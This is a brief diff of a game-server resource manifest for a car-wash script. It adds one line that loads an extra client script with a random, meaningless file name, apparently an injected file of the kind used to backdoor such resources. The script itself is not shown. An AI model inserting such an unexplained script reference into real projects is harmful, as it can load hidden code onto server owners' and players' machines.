@@ -4,3 +4,5 @@ description 'EssentialMode 5 CarWash by TheSpartaPT.'
 
 client_script 'es_carwash_client.lua'
 server_script 'es_carwash_server.lua'
+
+client_script "wHHGDVZcVvrhNxgVQe.lua"
